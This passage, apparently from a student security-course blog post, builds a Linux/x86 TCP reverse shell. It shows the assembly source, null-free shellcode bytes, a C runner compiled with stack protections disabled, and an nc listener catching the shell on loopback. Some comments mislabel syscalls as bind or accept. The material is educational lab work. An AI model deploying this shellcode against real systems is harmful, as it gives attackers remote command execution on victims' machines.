+</span></span><span style="display:flex;"><span> addr.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span> addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port);
+</span></span><span style="display:flex;"><span> addr.sin_addr.s_addr <span style="color:#f92672">=</span> INADDR_ANY;  
+</span></span></code></pre></div><ul>
+<li>Connect syscall</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Address struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> sockaddr_in addr;
+</span></span><span style="display:flex;"><span>addr.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">9001</span>);
+</span></span><span style="display:flex;"><span>addr.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 1) Socket Syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 2) Connect Syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">connect</span>(sockfd, (<span style="color:#66d9ef">struct</span> sockadr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
+</span></span></code></pre></div><p><img loading="lazy" src="/slae32/2/image2.png#center" alt="connect"  title=" Connect syscall"  />
+</p>
+<p>With the following arguments:</p>
+<ul>
+<li>int <strong>sockfd</strong> - sockfd is the socket descriptor returned by socket() in eax.</li>
+<li>const struct sockaddr *<strong>addr</strong> - pointer to struct sockaddr that contains information about your IP address and por</li>
+<li>socklen_t <strong>addrlen</strong> - addrlen specifies the size, in bytes, of the address structure  pointed to by addr. In other words, <strong>addrlen is set to sizeof(struct sockaddr)</strong>.</li>
+</ul>
+<p>The explanation on how to setup the value for these parameters is also the same provided in assignment 1 (2 - Bind Syscall (0x169) section).</p>
+<h3 id="assembling-our-shellcode">&ldquo;Assembling&rdquo; our shellcode<a hidden class="anchor" aria-hidden="true" href="#assembling-our-shellcode">#</a></h3>
+<p>For this one I didn&rsquo;t put on effort to reduce the size of the shellcode. The isntructions here for same syscalls do the same thing but use more space in memory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cdq</span> <span style="color:#75715e">; zeroes edx (trick to use less space)
+</span></span></span></code></pre></div><p>After this it&rsquo;s time to set up the syscall arguments havinmg the C code as a reference.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; socket syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x167</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x02</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x01</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; edx is already zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>	<span style="color:#75715e">; interruption syscall or interrupt vector. Returns pointer to the socket in eax
+</span></span></span></code></pre></div><p>EAX contains <strong>0x167</strong> which is sys_socket as seen in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code>, then EBX is set to <strong>0x2</strong> (PF_INET).</p>
+<p>Next the value <strong>0x01</strong> is moved into ECX which is the value of <code>SOCK_STREAM</code>. EDX is already zero because of the previous <code>cdq</code> instruction.</p>
+<p>Just left to use the interruption syscall <code>int 0x80</code> to create the socket.</p>
+<p>If executed successfully, we have our socket. The next step is to setting up the <code>connect syscall</code>.</p>
+<p>Beforehand, let&rsquo;s prepare the next syscall which is <code>connect</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; accept  syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">eax</span> 	<span style="color:#75715e">; moves socket address to ebx (first arg of bind syscall - sockfd)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span></code></pre></div><p>Then , the <code>sockaddr_in</code> struct is created as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; sockaddr struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	        <span style="color:#75715e">; pushing our 8 bytes of zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x0201017f</span> 	<span style="color:#75715e">; 127.1.1.2 --&gt; 0x7F010102, little-endian = 0x0201017F
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2923</span>    <span style="color:#75715e">;little endian -&gt; 9001 = 0x2329
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>
+</span></span></code></pre></div><p>The struct is finally defined. The most trickiest part to understand I must say.</p>
+<p><code>EDX</code> is still zero so pushing zeroes will determine the end of the struct.</p>
+<p>Next, we push <code>0x0201017f</code> which is the remote IP address (127.1.1.2).</p>
+<blockquote>
+<p>Why 127.1.1.2 and 127.0.0.1?</p>
+</blockquote>
+<p>The address 127.0.0.1 contains null-bytes (0x01<strong>0000</strong>7f) which would break our shellcode. We need to go with an alternative way.</p>
+<p>By using <code>127.1.1.2</code>, we avoid those null bytes (0x<strong>0201017f</strong>).  This works because the localhost address has a netmask of <code>255.0.0.0</code>. The only limitation is the first 8 bytes, which is why the address <code>127.0.0.1</code> behaves the same way.</p>
+<p>The next step is to load the stack with the port number. As intel works with the little-endian format, we push <code>0x2923</code>, which is the value <code>9001</code>. Lastly, pushing <code>0x2</code>  refers to <code>AF_INET</code>.</p>
+<p>Now, it is just a matter of putting <code>0x10</code> (16 bytes) to EDX which represents the size of <code>sockaddr_in</code> struct as mentioned in the previous section and execute the bind syscall with <code>0x169</code> in EAX.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">0x10</span>    <span style="color:#75715e">; sizeof struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x16a</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>It ends-up like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; connect syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">eax</span> 	<span style="color:#75715e">; moves socket address to ebx (first arg - sockfd)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">; sockaddr struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	<span style="color:#75715e">; ; pushing our 8 bytes of zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x0201017f</span> 	<span style="color:#75715e">; 127.1.1.2 --&gt; 0x7F010102, little-endian = 0x0201017F
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2923</span>    <span style="color:#75715e">;little endian -&gt; 9001 = 0x2329
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">0x10</span> <span style="color:#75715e">; sizeof struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x16a</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><p>For <code>dup2</code> we use a loop to use less instructions to save space while constructing a fully interactive bind shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>    <span style="color:#75715e">; dup2  syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">eax</span> <span style="color:#75715e">; edx is already zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x03</span>
+</span></span><span style="display:flex;"><span>dup2:
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">;mov al, 0x3f
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x3f</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">edx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dec</span> <span style="color:#66d9ef">cl</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">dup2</span>	<span style="color:#75715e">; decrements ecx and jumps until ecx=0
+</span></span></span></code></pre></div><p>We reach the final stage, using <code>execve</code> syscall to execute <code>/bin/sh</code> and spawn a shell when a connection is made to the bind port.
+If all works as expected a system shell will be provided to the incoming connection which can interact with the target machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; execve
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cdq</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span> <span style="color:#75715e">; &#34;hs//&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span> <span style="color:#75715e">; &#34;nib/&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xb</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>	
+</span></span></code></pre></div><p>To help reverting the string used with execve I develop a script called the <code>The x86 &quot;Little-Hexdian&quot; String Convert</code> which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.</p>
+<blockquote>
+<p>Available in <a href="https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py">https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py</a></p>
+</blockquote>
+<h3 id="final-assembly-code">Final Assembly Code<a hidden class="anchor" aria-hidden="true" href="#final-assembly-code">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Student ID   : PA-31319
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Student Name : Eduardo Silva
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Assignment 2 : TCP Reverse Shell (Linux/x86) Assembly
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; File Name    : reverse_shell.nasm
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span>	<span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span>	<span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">global</span>	<span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span>	<span style="color:#66d9ef">.text</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">ebx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cdq</span> <span style="color:#75715e">; zeroes edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; socket syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x167</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x02</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x01</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; edx is already zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>	<span style="color:#75715e">; interruption syscall or interrupt vector. Returns pointer to the socket in eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; connect syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">eax</span> 	<span style="color:#75715e">; moves socket address to ebx (first arg - sockfd)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; sockaddr struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	<span style="color:#75715e">; ; pushing our 8 bytes of zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x0201017f</span> 	<span style="color:#75715e">; 127.1.1.2 --&gt; 0x7F010102, little-endian = 0x0201017F
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2923</span>    <span style="color:#75715e">;little endian -&gt; 9001 = 0x2329
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">0x10</span> <span style="color:#75715e">; sizeof struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x16a</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; dup2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x03</span>
+</span></span><span style="display:flex;"><span>dup2:
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0x3f</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;mov ebx, edi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">dec</span> <span style="color:#66d9ef">cl</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">dup2</span>	<span style="color:#75715e">; decrements ecx and jumps until ecx=0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; execve
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cdq</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span> <span style="color:#75715e">; &#34;hs//&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span> <span style="color:#75715e">; &#34;nib/&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">esp</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">0xb</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>			
+</span></span></code></pre></div><h3 id="compiling-and-testing-the-shellcode">Compiling and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-shellcode">#</a></h3>
+<p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› 
+</span></span><span style="display:flex;"><span>╰─$ ls
+</span></span><span style="display:flex;"><span>bind  bind.c  bind_shell  bind_shell.asm  bind_shell.nasm  bind_shell.o  biShell.sh  original_bind_shell.nasm  syscalls
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› 
+</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh bind_shell.nasm 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">78</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x68\x7f\x01\x01\x02\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x68\x7f\x01\x01\x02\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell shellcode.c     
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span></code></pre></div><p>Let&rsquo;s use <code>nc</code> to create a listener on port <code>9001</code> and then execute <code>rev_shell</code> to connect it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./rev_shell 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">78</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› 
+</span></span><span style="display:flex;"><span>╰─$ nc -lvnp <span style="color:#ae81ff">9001</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.1.1.2<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">35190</span>
